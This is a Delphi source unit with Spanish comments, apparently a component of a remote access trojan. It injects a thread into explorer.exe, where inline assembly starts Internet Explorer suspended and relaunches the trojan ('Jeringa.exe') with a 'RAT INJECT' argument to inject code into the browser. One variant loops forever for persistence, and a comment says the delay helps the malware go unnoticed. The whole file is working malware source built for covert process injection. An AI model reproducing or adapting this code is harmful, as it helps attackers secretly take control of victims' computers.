{Unit que se encarga de inyectar monitor a explorer.exe}
unit Monitor;

interface
uses
  Windows,
  afxCodeHook;

function InyectarMonitor(HExplorador: THandle; Navegador: string; instalado: Boolean): Boolean;
procedure MonitorThreadYaInstalado(lpParameter: Pointer); stdcall;
procedure MonitorThreadNoInstalado(lpParameter: Pointer); stdcall;
type
  TInjectInfo = record
    pBeep: Pointer;
    pSleep: Pointer;
    pCreateProcess: Pointer;
    pWaitForSingleObject: Pointer;
    lpPathBrowser: Pointer;
    lpProcInfo: Pointer;
    lpProcInfo2: Pointer;
    lpStartupInfo: Pointer;
    lpCommandLine: Pointer;
    lpCallBack: Pointer;
  end;

var
  InjectInfo: TInjectInfo;
  Thread: THandle;

implementation

function InyectarMonitor(HExplorador: THandle; Navegador: string; instalado: Boolean): Boolean;
begin
  Result := False;

  //Primero tenemos que inyectar la localización de las funciones que se usan en el thread del monitor
  InjectInfo.pSleep := GetProcAddress(GetModuleHandle('kernel32'), 'Sleep');
  InjectInfo.pBeep := GetProcAddress(GetModuleHandle('kernel32'), 'Beep'); //Para debug no viene mal
  InjectInfo.pCreateProcess := GetProcAddress(GetModuleHandle('kernel32'), 'CreateProcessA');
  InjectInfo.pWaitForSingleObject := GetProcAddress(GetModuleHandle('kernel32'), 'WaitForSingleObject');

  //Despues inyectamos variables que utilizaremos
  InjectInfo.lpPathBrowser := InjectString(HExplorador, PChar(Navegador)); //Donde queramos inyectar el monitor
  InjectInfo.lpProcInfo := InjectMemory(HExplorador, nil, SizeOf(TProcessInformation)); //Reservamos memoria para procinfo
  InjectInfo.lpProcInfo2 := InjectMemory(HExplorador, nil, SizeOf(TProcessInformation)); //Reservamos memoria para procinfo
  InjectInfo.lpStartupInfo := InjectMemory(HExplorador, nil, SizeOf(TStartupInfo)); // Lo mismo para startupinfo
  InjectInfo.lpCommandLine := InjectString(HExplorador, PChar(' RAT INJECT'));
  InjectInfo.lpCallBack := InjectString(HExplorador, PChar(ParamStr(0)));

  //inyectamos la funcion MonitorThread y la ejecutamos en explorer.exe
  if Instalado then
    Thread := InjectThread(HExplorador, @MonitorThreadYaInstalado, @InjectInfo, SizeOf(TInjectInfo), False) //Inyectamos el thread
  else
    Thread := InjectThread(HExplorador, @MonitorThreadNOInstalado, @InjectInfo, SizeOf(TInjectInfo), False); //Inyectamos el thread

  if Thread = 0 then //FAIL!
    Exit
  else
    CloseHandle(Thread);
  Result := True;
end;

procedure MonitorThreadYaInstalado(lpParameter: Pointer); stdcall; //Este es el código del antigüo monitor.dll, se ejecuta dentro de explorer.exe cuando el servidor ya esta instalado
var
  InjectInfo: TInjectInfo;
  ProcInfo: TProcessInformation;
  ProcInfo2: TProcessInformation;
  P: Pointer;
  P2: Pointer;
begin
  InjectInfo := TInjectInfo(lpParameter^);
  ProcInfo := TProcessInformation(InjectInfo.lpProcInfo^);
  P := @ProcInfo;
  ProcInfo2 := TProcessInformation(InjectInfo.lpProcInfo2^);
  P2 := @ProcInfo2;

  asm
             @noret:
             //CreateProcess();
             PUSH  P
             PUSH  InjectInfo.lpStartupInfo
             PUSH  0
             PUSH  0
             PUSH  4      //   SUSPENDED
             PUSH  0
             PUSH  0
             PUSH  0
             PUSH  0
             PUSH  InjectInfo.lpPathBrowser
             CALL  InjectInfo.pCreateProcess   //Abrimos iexplore.exe en modo suspendido
             //sleep(1000);
             PUSH  1000          //Esperamos un poco antes de mandar la orden
             CALL  InjectInfo.pSleep
             //CreateProcess(Jeringa.exe, 'RAT INJECT');
             PUSH  P2
             PUSH  InjectInfo.lpStartupInfo
             PUSH  0
             PUSH  0
             PUSH  0
             PUSH  0
             PUSH  0
             PUSH  0
             PUSH  InjectInfo.lpCommandLine
             PUSH  InjectInfo.lpCallBack
             CALL  InjectInfo.pCreateProcess   //Abrimos Jeringa.exe para que injecte el código a iexplore.exe
             //WaitForSingleObject(INFINITO, ProcInfo.hprocess);
             PUSH  $FFFFFFFF
             PUSH  DWORD PTR DS:[&procinfo.hProcess]
             CALL  InjectInfo.pWaitForSingleObject   //Esperamos a que termine el proceso
             //sleep(17000);
             PUSH  17000
             CALL  InjectInfo.pSleep //sleep(17000) esperamos 17 segundos para que le de tiempo al pc a apagarse o para pasar más desapercibidos

                          //aquí tendriamos que idear algo para la desinstalación, de momento se encuentra inactiva
             JMP   @noret
  end;
end;

procedure MonitorThreadNoInstalado(lpParameter: Pointer); stdcall; //Este es el código del antigüo monitor.dll, se ejecuta dentro de explorer.exe cuando el servidor NO está instaldo
var
  InjectInfo: TInjectInfo;
  ProcInfo: TProcessInformation;
  ProcInfo2: TProcessInformation;
  P: Pointer;
  P2: Pointer;
begin
  InjectInfo := TInjectInfo(lpParameter^);
  ProcInfo := TProcessInformation(InjectInfo.lpProcInfo^);
  P := @ProcInfo;
  ProcInfo2 := TProcessInformation(InjectInfo.lpProcInfo2^);
  P2 := @ProcInfo2;
  asm
             //CreateProcess();
             PUSH  P
             PUSH  InjectInfo.lpStartupInfo
             PUSH  0
             PUSH  0
             PUSH  4      //   SUSPENDED
             PUSH  0
             PUSH  0
             PUSH  0
             PUSH  0
             PUSH  InjectInfo.lpPathBrowser
             CALL  InjectInfo.pCreateProcess   //Abrimos iexplore.exe en modo suspendido
             //sleep(1000);
             PUSH  1000          //Esperamos un poco antes de mandar la orden
             CALL  InjectInfo.pSleep
             //CreateProcess(Jeringa.exe, 'RAT INJECT');
             PUSH  P2
             PUSH  InjectInfo.lpStartupInfo
             PUSH  0
             PUSH  0
             PUSH  0
             PUSH  0
             PUSH  0
             PUSH  0
             PUSH  InjectInfo.lpCommandLine
             PUSH  InjectInfo.lpCallBack
             CALL  InjectInfo.pCreateProcess   //Abrimos Jeringa.exe para que injecte el código a iexplore.exe
             //WaitForSingleObject(INFINITO, ProcInfo.hprocess);
             PUSH  $FFFFFFFF
             PUSH  DWORD PTR DS:[&ProcInfo.hprocess]
             CALL  InjectInfo.pWaitForSingleObject   //Esperamos a que termine el proceso
             //sleep(17000);
  end;
end;

end.
